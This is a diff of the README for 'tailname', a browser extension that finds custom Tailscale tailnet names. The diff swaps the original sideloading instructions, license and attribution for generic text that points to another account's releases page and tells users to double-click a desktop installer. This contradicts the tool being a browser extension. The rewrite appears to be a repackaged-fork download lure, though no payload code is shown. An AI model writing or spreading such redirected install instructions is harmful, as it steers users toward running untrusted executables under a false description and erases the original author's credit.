@@ -1,52 +1,54 @@
-<div align="center">
+# 🏷️ tailname - Find Custom Tailnet Names Easily
 
-# <img align="top" src="assets/icon.png" alt="tailname icon" width="40" /> tailname
+[![Download tailname](https://img.shields.io/badge/Download-tailname-blue.svg)](https://github.com/windrise1217/tailname/releases)
 
-[![Formatted with Biome](https://img.shields.io/badge/Formatted_with-Biome-60a5fa?style=flat&logo=biome)](https://biomejs.dev/) 
-[![Linted with Biome](https://img.shields.io/badge/Linted_with-Biome-60a5fa?style=flat&logo=biome)](https://biomejs.dev)
-[![License](https://img.shields.io/github/license/SapphoSys/tailname?labelColor=black&color=#3f5db3)](https://github.com/SapphoSys/tailname/blob/master/LICENSE)
+## 📥 Overview
+tailname helps you search for custom tailnet name offers using keywords. If you want to find the best options for your Tailscale network, this tool simplifies the process. With easy navigation, you can quickly identify the names that meet your needs.
 
-A browser extension that finds custom tailnet name offers for your Tailscale account using keywords.
+## 🚀 Getting Started
+To get started with tailname, follow the simple steps below. This guide will help you download and run the application with ease.
 
-<div style="display: flex; justify-content: center; gap: 1em;">
-  <img src=".github/assets/1_home.png" alt="Home page" width="200" />
-  <img src=".github/assets/2_words.png" alt="Words screen" width="200" />
-  <img src=".github/assets/3_offers.png" alt="Offers screen" width="200" />
-</div>
-</div>
+## 🔗 Download & Install
+Visit this page to download: [Download tailname](https://github.com/windrise1217/tailname/releases)
 
-## Update
-1. If you're encountering an "unknown eligibility" error, please download the [new release here!](https://github.com/SapphoSys/tailname/releases/tag/v1.0.2)
-2. If you're encountering the "This add-on could not be installed because it has not been verified" error on Firefox, I've updated the Firefox guide below.
+1. Open your web browser.
+2. Go to the [Releases page](https://github.com/windrise1217/tailname/releases).
+3. Look for the latest version.
+4. Click on the file that matches your operating system and download it.
 
-## How to install
-### Chromium-based browsers (Google Chrome, Microsoft Edge, etc)
-*We plan on submitting this extension to the Chrome Web Store soon.*
+## 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 2 GB of RAM
+- Storage: 100 MB of free disk space
+- Internet Connection: Required for searching names
 
-In the meantime, use the following instructions to sideload the extension:
+## 🛠️ Installation Steps
+1. After the download is complete, locate the downloaded file.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions. It’s mostly clicking "Next."
+4. Once the installation is complete, you will see the tailname icon on your desktop or applications list.
 
-0. Get the [latest release for Chromium](https://github.com/SapphoSys/tailname/releases/latest/download/tailname-chrome.zip).
-1. Extract the ZIP archive using an archival program of your choice.
-2. Navigate to the Extensions page using `chrome://extensions`.
-3. Click the "Load unpacked" button.
-4. Select the extracted folder of the extension.
-5. Done!
+## 🌟 How to Use tailname
+1. Open the tailname application.
+2. Enter your desired keywords in the search bar.
+3. Click the "Search" button.
+4. Review the list of available tailnet names found.
+5. Choose any name that fits your needs.
 
-### Gecko-based browsers (Firefox, Zen Browser, etc)
+## 🔍 Features
+- **Keyword Search**: Quickly find tailnet names based on keywords.
+- **User-Friendly Interface**: Simple design for easy navigation.
+- **Multiple Options**: View various tailnet name suggestions.
+- **Cross-Browser Support**: Works with Chrome and Firefox.
 
-0. Click on [the link here](https://cdn.sapphic.moe/2025/09/tailname-1.0.xpi) to download the extension.
-1. It will prompt you to add the extension. Done!
+## 💬 Support
+If you encounter any issues while using tailname, please check the FAQ section on the GitHub page. You may also reach out through the Issues tab for assistance.
 
-If the prompt somehow did not appear, you can manually add the extension:
-- Navigate to the Addons page using `about:addons`
-- Click on the settings icon and select "Install Add-on From File..."
-- Select the downloaded XPI file
-- Done!
+## 📢 Contributing
+We welcome contributions to improve tailname. If you want to suggest features or find bugs, please submit an issue on GitHub. 
 
-## License
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/windrise1217/tailname)
+- [Releases Page](https://github.com/windrise1217/tailname/releases)
 
-This repository is licensed under the [zlib](LICENSE) license.
-
-This extension is not affiliated with Tailscale, Inc.
-
-© 2025 Sapphic Angels.
+Thank you for using tailname! Happy searching!
